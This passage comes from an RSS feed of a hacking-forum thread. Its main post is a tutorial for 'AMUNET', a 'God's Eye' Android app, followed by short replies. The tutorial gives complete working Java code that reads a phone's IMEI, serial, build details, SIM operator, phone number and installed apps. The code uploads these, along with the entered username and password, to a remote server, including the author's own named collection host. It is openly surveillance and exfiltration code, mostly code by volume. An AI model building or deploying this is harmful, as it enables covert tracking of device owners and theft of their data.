<p>Should you want to use my server, leave the POST parameters intact. Any slight modifications will cause the data to be rejected. I mean rejected.</p>
</blockquote>
</aside>
<p>Volley doesn’t handle inbuilt POST Method params perfectly so for that you need to create a custom response</p>
<p>Look at this: <a href="https://stackoverflow.com/a/31532955/4969957" rel="nofollow noopener">https://stackoverflow.com/a/31532955/4969957</a></p>
          <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/4</link>
        <pubDate>Fri, 29 Jun 2018 16:10:27 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7168-4</guid>
        <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168.rss">Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</title>
        <dc:creator><![CDATA[B4ZUH4CK3R]]></dc:creator>
        <description><![CDATA[
            <p>that’s a great code</p>
<p>i am gonna try this as soon as possible!!</p>
          <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/3</link>
        <pubDate>Wed, 27 Jun 2018 02:49:58 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7168-3</guid>
        <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168.rss">Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</title>
        <dc:creator><![CDATA[k0x3r]]></dc:creator>
        <description><![CDATA[
            <p>Very helpful. <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
          <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/2</link>
        <pubDate>Tue, 26 Jun 2018 05:42:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7168-2</guid>
        <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168.rss">Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</title>
        <dc:creator><![CDATA[sergeantsploit]]></dc:creator>
        <description><![CDATA[
            <p>Greetings my fellow hackers,</p>
<p>As we continue with our series, the AMUNET app becomes complicated with new functionalities and structures to understand. We’ll sail right through. As stated earlier in previous tutorials, the app doesn’t fully exists because I build them before I share so forgive me if it takes sometime before a tutorial comes out. I need to make sure everything works well first.</p>
<p><strong>PREVIOUS TUTORIALS</strong></p>
<p>Below are the tutorials covered so far.</p>
<ol>
<li><a href="https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112/4">Introduction to Amunet</a></li>
<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121">Collecting Installed Android Apps</a></li>
</ol>
<p><strong>TODAY’S TUTORIAL</strong></p>
<p>In today’s tutorial, we are going to send data to our server using <a href="https://developer.android.com/training/volley/" rel="noopener nofollow ugc">Volley Google</a>. Volley is an HTTP library that makes networking for Android apps easier and most importantly, faster. In order to use volley in our android app, we first need to import it into our android studio project.</p>
<p>Go to <code>build.gradle</code> ( Module: app ) under Grade Scripts and add the dependency  <code>implementation 'com.android.volley:volley:1.1.0'</code>. Make sure you sync the project. You should something similar to this.</p>
<blockquote>
<pre><code>dependencies {
    implementation fileTree(dir: 'libs', include: ['*.jar'])
    implementation 'com.android.support:appcompat-v7:27.1.1'
    implementation 'com.android.support.constraint:constraint-layout:1.1.2'
    implementation 'com.android.support:design:27.1.1'
    testImplementation 'junit:junit:4.12'
    androidTestImplementation 'com.android.support.test:runner:1.0.2'
    androidTestImplementation 'com.android.support.test.espresso:espresso-core:3.0.2'

    implementation 'com.android.volley:volley:1.1.0'
</code></pre>
<p>}</p>
</blockquote>
<p>Now, we can go on to use the volley library in our project. Before we continue, create a new <code>Basic Activity</code> called “<code>Dashboard</code>”. We wouldn’t use it now ( later in this tutorial ). The reason why we are creating the <code>Dashboard</code> activity is because we are going to use the <code>MainActivity.java</code> for phone registration.</p>
<p><strong>SETTING UP AN APP ICON</strong></p>
<p>No one likes using the default icon for created projects. You can use any icon of your choice. I’m using an eye image. Make sure your image is big enough. I’ll upload it here incase anyone wants to use it.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/1/157311909021c87f07f96ccb6068e48d66a90b2d.jpg" alt="eye2" data-base62-sha1="33KyJzNE4SE77ZF3y3dfwPFPofj" width="261" height="200"></p>
<p>Now, head over to <a href="http://romannurik.github.io/AndroidAssetStudio/icons-launcher.html" rel="noopener nofollow ugc">Roman Urik’s Github</a>. I love using this tool because of the ease it allows for the customization of icons. Select <code>Image</code> ( Under Foreground ) and upload your preferred image. Customize the icon according to your taste. I’m using a white background.</p>
<p>After you are done, click on the <code>Download button</code> on the upper right section of the website under the <code>Source on Github</code> link. The image should be downloaded onto your computer.</p>
<p>Extract the package and you should notice the icons are grouped into resolutions. Don’t mess them up. They are grouped intentionally. Go back to the Android Studio and under <code>res</code>, right click on <code>mipmap</code>. On Mac, choose “Reveal in Finder” and on Windows, something similar maybe “Open in Explorer” or “Explore” should open the mipmap directory in your explorer. Now copy the files accordingly from the extracted mipmap folder to the opened android studio mipmap directory. Should everything be done correctly, the new icons copied will show in the android studio. If you still have trouble, search online or watch this video <a href="https://www.youtube.com/watch?v=SDKwNh0TioE" rel="noopener nofollow ugc">Change The App Icon in Android Studio - YouTube</a></p>
<p>Open  <code>AndroidManifest</code> ( under app-&gt;manifests ) and change the value for <code>android:roundIcon</code> and <code>android:icon</code> in the <code>application</code> tag to the filename of the app icon imported. This will  allow the app use the icon.</p>
<p>Still in <code>AndroidManifest</code> file, add the <code>READ_PHONE_STATE</code>, <code>INTERNET</code> AND <code>ACCESS_NETWORK_STATE</code> permissions. Above the application tag opening, add these lines.</p>
<pre><code>&lt;uses-permission android:name="android.permission.READ_PHONE_STATE" /&gt;
&lt;uses-permission android:name="android.permission.INTERNET" /&gt;
&lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /&gt;
</code></pre>
<p><strong>CREATING THE UI FOR MAIN ACTIVITY</strong></p>
<p>Two files are created under the <code>layout</code> folder when a Basic Activity is chosen. In our case, it’s <code>activity_main.xml</code> and <code>content_main.xml</code> unless you named your activity otherwise.</p>
<p>In the activity_main.xml, clear the <code>toolbar</code> and the <code>appbarlayout</code>  code. Our code should look like this.</p>
<blockquote>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;android.support.design.widget.CoordinatorLayout 
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity"&gt;

    &lt;include layout="@layout/content_main" /&gt;

&lt;/android.support.design.widget.CoordinatorLayout&gt;
</code></pre>
</blockquote>
<p>We will design our registration interface in the <code>content_main</code>. The code for the UI</p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:app="http://schemas.android.com/apk/res-auto"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:padding="20dp"
app:layout_behavior="@string/appbar_scrolling_view_behavior"
tools:context=".MainActivity"
tools:showIn="@layout/activity_main"&gt;

&lt;android.support.design.widget.TextInputLayout
    android:layout_width="match_parent"
    android:id="@+id/textinputlayout1"
    android:layout_centerHorizontal="true"
    android:layout_centerVertical="true"
    android:layout_height="wrap_content"&gt;

    &lt;EditText
        android:layout_width="match_parent"
        android:hint="Username"
        android:id="@+id/username"
        android:layout_height="wrap_content" /&gt;

&lt;/android.support.design.widget.TextInputLayout&gt;

&lt;android.support.design.widget.TextInputLayout
    android:layout_width="match_parent"
    android:id="@+id/textinputlayout2"
    android:layout_below="@id/textinputlayout1"
    android:layout_height="wrap_content"&gt;

    &lt;EditText
        android:layout_width="match_parent"
        android:hint="Name"
        android:id="@+id/full_name"
        android:layout_height="wrap_content" /&gt;

&lt;/android.support.design.widget.TextInputLayout&gt;

&lt;android.support.design.widget.TextInputLayout
    android:layout_width="match_parent"
    android:id="@+id/textinputlayout3"
    android:layout_below="@id/textinputlayout2"
    android:layout_centerHorizontal="true"
    android:layout_centerVertical="true"
    android:layout_height="wrap_content"&gt;

    &lt;EditText
        android:layout_width="match_parent"
        android:hint="Password"
        android:inputType="textWebPassword"
        android:id="@+id/password"
        android:layout_height="wrap_content" /&gt;

&lt;/android.support.design.widget.TextInputLayout&gt;

&lt;ImageView
    android:layout_width="150dp"
    android:src="@drawable/eye2"
    android:layout_marginBottom="10dp"
    android:layout_above="@id/textinputlayout1"
    android:layout_centerHorizontal="true"
    android:id="@+id/logo_imageview"
    android:layout_height="150dp" /&gt;

&lt;Button
    android:layout_width="match_parent"
    android:text="Sign up"
    android:id="@+id/create_account_button"
    android:textColor="@android:color/white"
    android:layout_marginTop="10dp"
    android:background="@color/colorPrimary"
    android:layout_below="@id/textinputlayout3"
    style="@style/Base.Widget.AppCompat.Button.Borderless"
    android:layout_height="wrap_content" /&gt;
&lt;/RelativeLayout&gt;
</code></pre>
<p>I have already uploaded the image ( eye2 ) for the ImageView  ( located in the drawable folder ) in the setting up app icon section of this tutorial. You can change the source of the ImageView or rename my image to eye2 in the drawable folder.</p>
<p>This is my screen right now.</p>
<p><img src="//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/8/89bbcb74fefead9cbb520c9dabd142a06591fe3f.jpeg"></p>
<p><strong>CONFIGURATION.JAVA</strong></p>
<p>Create a new Java class and name it <code>Configuration</code>. Inside <code>Configuration</code> class, write this code.</p>
<pre><code>private static final String app_host = "xx.xx.xx.xx";
private static final String domain_path = "https://" + app_host + "/";
private static final String app_auth = domain_path + "/receiver.php";

public static String getApp_host() {
    return app_host;
}

public static String getDomain_path() {
    return domain_path;
}

public static String getApp_auth() {
    return app_auth;
}
</code></pre>
<p>The <code>Configuration</code> java class we just created will allow us to reference the server address from this file instead of manually typing it across the entire project which is like not cool.</p>
<ol>
<li>
<code>xx.xx.xx.xx</code> is the server address ( localhost, network address ) eg <a href="http://0x00sec.org">0x00sec.org</a> or 104.18.48.48</li>
<li>
<code>domain_path</code> is the qualified domain server path including the appropriate protocols. eg <a href="https://0x00sec.org/">https://0x00sec.org/</a>. Don’t modify this line since it’s just a reference.</li>
<li>
<code>app_auth</code> is a file on the server that receives the request. Takes the server path and the receiving file path.</li>
</ol>
<p>The remaining methods are <code>getters</code> ( <code>Right click</code> -&gt; <code>Generate</code> -&gt; <code>Getter</code> ).</p>
<p><strong>WRITING THE CODES FOR MAINACTIVITY.JAVA</strong></p>
<p>The final part of this tutorial will be a bit tricky so try and read with understanding as I also try to explain in simple terms.</p>
<p>Normally, above the <code>onCreate</code> method and below <code>public class MainActivity extends ...</code> code, lets declare our UI objects.</p>
<pre><code>EditText username, password, name;
Button create_account_button;

SharedPreferences sharedPreferences;

private static final int READ_PHONE_STATE_REQUEST_CODE = 10001;

ProgressDialog progressDialog;
</code></pre>
<p>Basically</p>
<ol>
<li>We declare the EditText for our username, password and name fields ( content_main.xml ).</li>
<li>We declare the Button for our sign up button ( content_main.xml )</li>
<li>
<a href="https://developer.android.com/reference/android/content/SharedPreferences" rel="noopener nofollow ugc">SharedPreferences</a> allows us to save information. We create an instance of it.</li>
<li>
<code>READ_PHONE_STATE_REQUEST_CODE</code> will allow us determine if our permission request was granted or denied ( discussed later ).</li>
<li>ProgressDialog will allow us to display a progress bar with a message.</li>
</ol>
<p><strong>onCreate Method</strong></p>
<p>This will be the code for our onCreate method.</p>
<pre><code>@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    sharedPreferences = getSharedPreferences("Auth", Context.MODE_PRIVATE);

    final String auth_key = sharedPreferences.getString("auth_key", null);

    if(auth_key != null) {
        startActivity(new Intent(MainActivity.this, Dashboard.class));
        finish();
    }

    username = findViewById(R.id.username);
    password = findViewById(R.id.password);
    name = findViewById(R.id.full_name);

    create_account_button = findViewById(R.id.create_account_button);
    create_account_button.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View view) {
            if(ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                show_permission_alert("Allow the app to read the phone's information", "read_phone_state");
            } else {

                if(username.getText().toString().length() &lt; 5) {
                    show_alert("Username must be more than 5 characters");
                    return;
                }

                if(password.getText().toString().length() &lt; 5) {
                    show_alert("Password must be more than 5 characters");
                    return;
                }

                if(name.getText().toString().length() &lt; 3) {
                    show_alert("Enter a valid name");
                    return;
                }

                progressDialog = new ProgressDialog(MainActivity.this);
                progressDialog.setMessage("Creating account ...");
                progressDialog.setCancelable(false);
                progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
                progressDialog.show();

                create_phone_account();
            }
        }
    });
}
</code></pre>
<ol>
<li>
<code>sharedPreferences</code> - get a file “<code>Auth</code>” ( key-value file ). <code>MODE_PRIVATE</code> makes the file private to our app.</li>
<li>
<code>String auth_key</code> - gets the value for the key ( <code>auth_key</code> ) in our <code>Auth</code> file. Returns <code>null</code> if the key <code>doesn't exist</code>.</li>
<li>If the key exists ( phone registered ), redirect us to the <code>Dashboard</code> activity we created earlier.</li>
<li>Set reference to our respective EditTexts ( <code>username</code>, <code>password</code>, <code>name</code> )</li>
<li>Set reference to the signup button ( create_account_button)</li>
<li>When the button is clicked, we check if the <code>READ_PHONE_STATE</code> permission has been granted. If the permission hasn’t been granted, we call <code>show_permission_alert</code> method ( takes two arguments: <code>message</code> and <code>permission_id</code> ). Will create the method in a bit.</li>
<li>If the permission is granted, then we check and make sure our <code>username</code>, <code>name</code> and <code>passwords</code> fields have valid data before we send them to our server. There is also a new method called <code>show_alert</code> which displays messages to the user.</li>
<li>If the data is valid, we call the <code>create_phone_account</code> method to send our registration details to the server.</li>
</ol>
<p>Hope I got someone to understand it.</p>
<p>The permission <code>READ_PHONE_STATE</code> allows us to read the phone’s International Mobile Equipment Identity ( IMEI ). With the IMEI, we can later identify the phone and user accounts registered with it.</p>
<p>From <code>#6</code> ( above ), should the permission be denied, we call the <code>show_permission_alert</code>. Lets create the method.</p>
<p><strong>SHOW_PERMISSION_ALERT</strong></p>
<p>Outside the <code>onCreate</code> and inside the <code>MainActivity</code> class, create this method.</p>
<pre><code>private void show_permission_alert(String message, final String permission) {
    AlertDialog.Builder dialog=new AlertDialog.Builder(MainActivity.this);
    dialog.setMessage(message);
    dialog.setCancelable(false);
    dialog.setPositiveButton("Ok",new DialogInterface.OnClickListener() {

        @Override
        public void onClick(DialogInterface dialog, int which) {
            if(permission.toLowerCase().equals("read_phone_state")) {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[] {Manifest.permission.READ_PHONE_STATE},
                        READ_PHONE_STATE_REQUEST_CODE);
            }
        }

    });
    dialog.show();
}
</code></pre>
<p>It simply displays any message you pass to it. After you read the message displayed and you click “Ok”, the method checks if the <code>permission_id</code> passed during the method call matches the ones specified in the method. If they match, the appropriate code executes. The reason for this approach is that we will be asking for a lot of future permissions and instead of creating different methods every time, we can instead group them into one method along with their respective codes.</p>
<p>In this method, we request the <code>READ_PHONE_STATE</code> permission when the “<code>read_phone_state</code>” is passed. The <code>READ_PHONE_STATE_REQUEST_CODE</code> will allow us to check if the permission was granted or not. Before we move on to check the whether our permission was granted or not, lets create the <code>show_alert</code> method. Similar to the <code>show_permission_alert</code> method but just displays messages and does not accept <code>permissions_id</code>.</p>
<p><strong>SHOW_ALERT</strong></p>
<p>There is not much explanation to be done here as I’ve already explained.</p>
<pre><code>protected void show_alert(String msg) {
    AlertDialog.Builder dialog=new AlertDialog.Builder(MainActivity.this);
    dialog.setMessage(msg);
    dialog.setPositiveButton("Ok",new DialogInterface.OnClickListener() {

        @Override
        public void onClick(DialogInterface dialog, int which) {
            dialog.dismiss();
        }

    });
    dialog.show();
}
</code></pre>
<p>Just displays messages.</p>
<p><strong>ON REQUEST PERMISSIONS RESULT</strong></p>
<p>This method allows us to check if the permission request was granted or not. In order to determine the state of the permission request, we’ll need the identifier ( request code - <code>READ_PHONE_STATE_REQUEST_CODE</code> ). Hope you now understand the importance of the request code integer value.</p>
<pre><code>@Override
public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
    switch (requestCode) {
        case READ_PHONE_STATE_REQUEST_CODE: {
            if (grantResults.length &gt; 0
                    &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(getApplicationContext(), "Without this permission, the desired action cannot be performed", Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(getApplicationContext(), "Permission granted", Toast.LENGTH_LONG).show();
            }
            return;
        }
    }
}
</code></pre>
<p>We print the appropriate response based on the user’s action. Since we need the <code>READ_PHONE_STATE</code> permission in order to get the app working, we won’t allow registration unless the permission is allowed.</p>
<p><strong>GET DEVICE IMEI</strong></p>
<p>IMEI’s are unique to every phone meaning we can track a phone based on its IMEI. We use the IMEI to identify a phone and not mix the data. This method will retrieve the IMEI of the phone and return it to its caller.</p>
<pre><code>protected String getDeviceIMEI() {
    String deviceUniqueIdentifier = null;
    TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
    if (null != tm) {
        try {
            deviceUniqueIdentifier = tm.getDeviceId();
        } catch (SecurityException e) {
            return null;
        }
    }
    if (null == deviceUniqueIdentifier || 0 == deviceUniqueIdentifier.length()) {
        deviceUniqueIdentifier = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
    }
    return deviceUniqueIdentifier;
}
</code></pre>
<p>Makes use of the <code>Telephony Manager</code> which requires the <code>READ_PHONE_STATE</code> permission. Now in the <code>onClickListener</code> function of the <code>create_account_button</code> ( onCreate method ), there is one last method we have not tackled and that is the <code>create_phone_account</code>.</p>
<p><strong>CREATE PHONE ACCOUNT</strong></p>
<p>Before we move on, in the previous tutorial <a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121">Building a God’s Eye Android App: Part 1 - Collecting Installed Android Apps</a>, we included a thread calling the <code>collect_installed_apps</code> in the <code>onCreate</code> method. Kindly delete that thread. The <code>onCreate</code> method should now look like this.</p>
<p><img src="//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/2/2f3c0b5690bb7aaf9e9fefd224928ee136efaf6a.jpeg"></p>
<p>Moving on to the <code>create_phone_acccount</code> method</p>
<pre><code>private void create_phone_account() {

    final String phone_imei = getDeviceIMEI();
    final String phone_serial = Build.SERIAL;

    RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);

    StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener&lt;String&gt;() {
        @Override
        public void onResponse(String req) {
            progressDialog.dismiss();

            try {

                final JSONObject response = new JSONObject(req);

                if(response.getBoolean("success")) {
                    final String server_response = response.getString("response");

                    SharedPreferences.Editor editor = sharedPreferences.edit();

                    editor.putString("auth_key", response.getString("api_key"));

                    editor.apply();

                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            collect_phone_details();
                            collect_installed_apps();
                        }
                    }).start();

                    new CountDownTimer(5000,1000) {
                        @Override
                        public void onTick(long l) {

                        }

                        @Override
                        public void onFinish() {
                            show_alert(server_response);
                        }
                    }.start();

                    username.setText("");
                    password.setText("");
                    name.setText("");

                } else {
                    show_alert(response.getString("response"));
                }
            } catch (Exception e) {
                show_alert("Authentication error: " + e.getMessage());
            }
        }
    }, new Response.ErrorListener() {
        @Override
        public void onErrorResponse(VolleyError error) {
            progressDialog.dismiss();
            show_alert("Internet disconnected");
        }
    }) {
        protected Map&lt;String, String&gt; getParams() {
            Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
            params.put("imei", phone_imei);
            params.put("serial", phone_serial);
            params.put("user", username.getText().toString());
            params.put("name", name.getText().toString());
            params.put("pass", password.getText().toString());
            return params;
        }
    };

    requestQueue.add(serverRequest);
}
</code></pre>
<p>This method makes use of the RequestQueue function in the volley library to send requests. In this case we are sending a POST request. Notice the parameters</p>
<pre><code>protected Map&lt;String, String&gt; getParams() {
        Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
        params.put("imei", phone_imei);
        params.put("serial", phone_serial);
        params.put("user", username.getText().toString());
        params.put("name", name.getText().toString());
        params.put("pass", password.getText().toString());
        return params;
}
</code></pre>
<p>The POST parameters being sent here are optional and not mandatory. I have set up a web server which accepts these specific parameters so incase you don’t have a server to test and want to use my server, send these particular parameters otherwise the data won’t be logged.</p>
<p>The codes in the <code>onResponse</code> method are also optional and not mandatory. My web server gives each phone an API key to access the platform after phone registration. Incase you want to use my server, all data sent will have to be posted with the API key otherwise the incoming data will be discarded.</p>
<p>The thread we earlier deleted in the <code>onCreate</code> method will now be called here should the response have a success field set to true. Remember the response is converted to a JSON Object. Volley allows us to directly receive the data in JSONObject but for debugging purposes, I used the StringRequest to see what was returned before converting the strings to JSON ( Was having issues with my server back then ).</p>
<p>After the phone information has been logged on your web server or mine. You can begin to send data to the server. A thread is run in the <code>onResponse</code> method calling two methods <code>collect_phone_details</code> and <code>collect_installed_apps</code>. After a count down of 5 seconds, the server response is shown. The delay allows the two methods <code>collect_phone_details</code> and <code>collect_installed_apps</code> to finish execution before the user gets the chance to perform any further action which can interrupt the upload.</p>
<p><strong>COLLECT PHONE DETAILS</strong></p>
<p>In this method, we gather information about our device using <code>Build</code> ( android.os ) and TelephonyManager ( SIM Operations ).</p>
<pre><code>private void collect_phone_details() {
    upload_detail("VERSION.RELEASE", Build.VERSION.RELEASE);
    upload_detail("VERSION.INCREMENTAL", Build.VERSION.INCREMENTAL);
    upload_detail("VERSION.SDK.NUMBER", String.valueOf(Build.VERSION.SDK_INT));
    upload_detail("BOARD", Build.BOARD);
    upload_detail("BOOTLOADER", Build.BOOTLOADER);
    upload_detail("BRAND", Build.BRAND);
    upload_detail("CPUABI", Build.CPU_ABI);
    upload_detail("CPUABI2", Build.CPU_ABI2);
    upload_detail("DISPLAY", Build.DISPLAY);
    upload_detail("FINGERPRINT", Build.FINGERPRINT);
    upload_detail("HARDWARE", Build.HARDWARE);
    upload_detail("HOST", Build.HOST);
    upload_detail("ID", Build.ID);
    upload_detail("MANUFACTURER", Build.MANUFACTURER);
    upload_detail("MODEL",Build.MODEL);
    upload_detail("PRODUCT", Build.PRODUCT);
    upload_detail("SERIAL", Build.SERIAL);
    upload_detail("TAGS", Build.TAGS);
    upload_detail("TIME", String.valueOf(Build.TIME));
    upload_detail("TYPE", Build.TYPE);
    upload_detail("UNKNOWN",Build.UNKNOWN);
    upload_detail("USER", Build.USER);
    upload_detail("DEVICE", Build.DEVICE);

    TelephonyManager telephonyManager = ((TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE));
    String simOperatorName = telephonyManager.getSimOperatorName();
    String simNumber = "";

    try {
        simNumber = telephonyManager.getLine1Number();
    } catch (SecurityException e) {
    }

    upload_detail("SIM1.OPERATOR", simOperatorName);
    upload_detail("SIM1.PHONE", simNumber);
}
</code></pre>
<p>The method makes an extensive use of another method <code>upload_detail</code> to send data to our server.  If you intend to use my server, leave the values intact otherwise the information won’t show. If you don’t intend to use my server, then feel free to modify the parameters and requests as you wish.</p>
<p><strong>UPLOAD DETAILS</strong></p>
<p>This method sends data to the server using the api_key obtained during the registration process. The key is stored on the device using sharedPreferences. The method won’t upload if there is no api key.</p>
<pre><code>private void upload_detail(final String key, final String value) {
    RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);

    final String auth_key = sharedPreferences.getString("auth_key", null);

    if(auth_key == null) { return; }

    StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener&lt;String&gt;() {
        @Override
        public void onResponse(String req) {
        }
    }, new Response.ErrorListener() {
        @Override
        public void onErrorResponse(VolleyError error) {
        }
    }) {
        protected Map&lt;String, String&gt; getParams() {
            Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
            params.put("auth", auth_key);
            params.put("k", key);
            params.put("v", value);
            return params;
        }
    };

    requestQueue.add(serverRequest);
}
</code></pre>
<p>Should you want to use my server, leave the POST parameters intact. Any slight modifications will cause the data to be rejected. I mean rejected. Otherwise, you are free to use and name your POST parameters as you please.</p>
<pre><code>protected Map&lt;String, String&gt; getParams() {
        Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
        params.put("auth", auth_key);
        params.put("k", key);
        params.put("v", value);
        return params;
}
</code></pre>
<p>Be sure to keep the data intact. I can’t stress on it enough if you are to use my server.</p>
<p><strong>COLLECT INSTALLED APPS</strong></p>
<p>Last but one of the method calls for today’s tutorial. This method enumerates through the Package Manager and gets information about apps installed on the device. In our previous tutorial, we had only two parameters: app name and package name. Now we have included three more parameters.</p>
<pre><code>private void collect_installed_apps() {
    final PackageManager pm = getPackageManager();
    List&lt;ApplicationInfo&gt; packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
    for (ApplicationInfo packageInfo : packages) {
        if(pm.getLaunchIntentForPackage(packageInfo.packageName) != null)
        {
            try {
                String app_name = packageInfo.loadLabel(getPackageManager()).toString();
                String app_package = packageInfo.processName;
                String app_uid = Integer.toString(packageInfo.uid);
                String app_versionName = pm.getPackageInfo(app_package, 0).versionName.toString();
                String app_versionCode = String.valueOf(pm.getPackageInfo(app_package, 0).versionCode);

                upload_app(app_name, app_package, app_uid, app_versionName, app_versionCode);
            } catch (Exception e) {

            }
        }
    }
}
</code></pre>
<p>There is not much to explain as I have already done that in the previous tutorial. The new parameters are <code>app_uid</code>, <code>app_versionName</code> and <code>app_versionCode</code>.</p>
<p><strong>UPLOAD APP</strong></p>
<p>This function uploads data about the installed apps to the server. You are free to modify the parameters if you are not using my server as a backend.</p>
<pre><code>private void upload_app(final String app_name, final String app_package, final String app_uid, final String app_vName, final String app_vCode) {
    RequestQueue requestQueue = Volley.newRequestQueue(MainActivity.this);

    final String auth_key = sharedPreferences.getString("auth_key", null);

    if(auth_key == null) { return; }

    StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener&lt;String&gt;() {
        @Override
        public void onResponse(String req) {
        }
    }, new Response.ErrorListener() {
        @Override
        public void onErrorResponse(VolleyError error) {
        }
    }) {
        protected Map&lt;String, String&gt; getParams() {
            Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
            params.put("auth", auth_key);
            params.put("app_name", app_name);
            params.put("app_package", app_package);
            params.put("app_uid", app_uid);
            params.put("app_vname", app_vName);
            params.put("app_vcode", app_vCode);
            return params;
        }
    };

    requestQueue.add(serverRequest);
}
</code></pre>
<p>That’s it for this tutorial.</p>
<p><strong>CONFIGURING YOUR ANDROID APP TO COMMUNICATE WITH MY SERVER ( AMUNETCLOUD )</strong></p>
<p>In communicating with AMUNETCLOUD, you need to make sure the following settings are in place.</p>
<p>Change the address in the Configuration to</p>
<pre><code>private static final String app_host = "play.cardfinder.co";
private static final String domain_path = "https://" + app_host + "/";
private static final String app_auth = domain_path + "/auth.php";
</code></pre>
<p>Secondly, make sure that you do not modify the original codes posted here as the server will reject modified request or data.</p>
<p><strong>ACCESSING UPLOADED PHONE INFORMATION</strong></p>
<p>To access your data, simply log onto <a href="https://play.cardfinder.co/" rel="noopener nofollow ugc">AMUNETCLOUD</a> using the credentials entered during registration. You should be redirected to your phone data.</p>
<p><strong>DISCLAIMER</strong></p>
<p>The server is a test or demonstration server and therefore I will not be held accountable for whatever data is sent to it. It’s purely for education purpose.</p>
<p>I would love your contributions, suggestions, feedbacks, critics, etc. Anything to help the series.</p>
<p>You can directly import the project into your android studio if you are having trouble.</p>
<p>Checkout the github repo: <a href="https://github.com/sergeantexploiter/Amunet" class="inline-onebox-loading" rel="noopener nofollow ugc">https://github.com/sergeantexploiter/Amunet</a></p>
<p>Until we meet again. I’m out.</p>
<p><strong><span class="hashtag">#Sergeant</span></strong></p>
          <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168/1</link>
        <pubDate>Tue, 19 Jun 2018 22:13:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7168-1</guid>
        <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168.rss">Building a God’s Eye Android App: Part 2 - Sending Information to a Web Server</source>
      </item>
  </channel>
</rss>
